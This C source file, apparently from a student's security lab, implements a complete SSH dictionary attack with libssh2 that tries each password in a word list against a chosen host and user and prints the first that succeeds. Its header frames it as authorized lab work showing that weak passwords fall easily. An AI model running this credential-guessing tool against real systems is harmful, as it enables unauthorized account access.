/*
 * ssh_dictionary_check.c — part of my Systems & Network Security lab. Author: Vansh Bhardwaj.
 *
 * AUTHORIZED, EDUCATIONAL USE ONLY. Written and run inside an isolated lab
 * sandbox against my own VMs, with authorization. Running credential guessing
 * against any system you do not own or lack explicit written permission to test
 * is illegal. Published only to document the lab and make the point concrete:
 * weak or reused SSH passwords fall to a trivial dictionary. The defenses
 * (key-only auth, strong unique passwords, fail2ban / rate limiting, and
 * alerting on repeated failures) are in the README.
 *
 * SPDX-License-Identifier: MIT
 * Copyright (c) 2025 Vansh Bhardwaj. See the LICENSE file in this repository.
 *
 * Reads dictionary.txt, tries each line as the password for a given username
 * over SSH (libssh2), pausing 1s between attempts, prints the first that works.
 *   Build:  cc ssh_dictionary_check.c -lssh2 -o ssh_dictionary_check
 *   Usage:  ./ssh_dictionary_check <hostname> <username>
 */
#include <libssh2.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <unistd.h>     // close(), sleep()
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define DICT_FILE "dictionary.txt"
#define PORT 22
#define PWD_MAX 256
#define SLEEP_BETWEEN_ATTEMPTS 1 /* seconds */

int try_password_on_host(const char *host, const char *username, const char *password);

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <hostname> <username>\n", argv[0]);
        return 1;
    }
    const char *hostname = argv[1];
    const char *username = argv[2];

    FILE *fp = fopen(DICT_FILE, "r");
    if (!fp) {
        perror("fopen dictionary");
        return 1;
    }

    /* initialize libssh2 once for the program */
    if (libssh2_init(0) != 0) {
        fprintf(stderr, "libssh2 initialization failed\n");
        fclose(fp);
        return 1;
    }

    char line[PWD_MAX];
    int attempt = 0;
    int found = 0;
    while (fgets(line, sizeof(line), fp) != NULL) {
        /* trim newline and carriage return */
        line[strcspn(line, "\r\n")] = '\0';
        attempt++;
        int res = try_password_on_host(hostname, username, line);
        if (res == 0) {
            printf("password= '%s'\n", line);
            found = 1;
            break;
        }
        /* polite pause */
        sleep(SLEEP_BETWEEN_ATTEMPTS);
    }
    if (!found) {
        printf("[-] No password succeeded from %s\n", DICT_FILE);
    }
    fclose(fp);
    libssh2_exit();
    return 0;
}

/* returns 0 on successful auth, non-zero otherwise */
int try_password_on_host(const char *host, const char *username, const char *password) {
    int sock = -1;
    struct hostent *he;
    struct sockaddr_in sin;
    LIBSSH2_SESSION *session = NULL;
    char *methods = NULL;
    int rc = 1; /* default: failure */

    /* Resolve hostname */
    he = gethostbyname(host);
    if (!he) {
        fprintf(stderr, "gethostbyname(%s) failed: %s\n", host, hstrerror(h_errno));
        return 2;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 2;
    }
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT);
    memcpy(&sin.sin_addr, he->h_addr_list[0], he->h_length);

    /* connect (TCP) */
    if (connect(sock, (struct sockaddr *)(&sin), sizeof(struct sockaddr_in)) != 0) {
        perror("connect");
        close(sock);
        return 2;
    }

    /* create and start SSH session */
    session = libssh2_session_init();
    if (!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        close(sock);
        return 2;
    }
    libssh2_session_set_blocking(session, 1);
    if (libssh2_session_startup(session, sock)) {
        fprintf(stderr, "libssh2_session_startup failed\n");
        libssh2_session_free(session);
        close(sock);
        return 2;
    }

    /* query allowed auth methods for the username */
    methods = libssh2_userauth_list(session, (char *)username, (unsigned int)strlen(username));
    if (!methods) {
        fprintf(stderr, "libssh2_userauth_list returned NULL\n");
        libssh2_session_disconnect(session, "bye");
        libssh2_session_free(session);
        close(sock);
        return 2;
    }
    if (strstr(methods, "password") == NULL) {
        fprintf(stderr, "Server does not allow password auth for user '%s'\n", username);
        libssh2_session_disconnect(session, "bye");
        libssh2_session_free(session);
        close(sock);
        return 2;
    }

    /* attempt password auth */
    if (libssh2_userauth_password(session, (char *)username, (char *)password) == 0) {
        rc = 0; /* success */
    } else {
        rc = 1; /* wrong password or other auth error */
    }

    /* clean up */
    libssh2_session_disconnect(session, "closing");
    libssh2_session_free(session);
    close(sock);
    return rc;
}
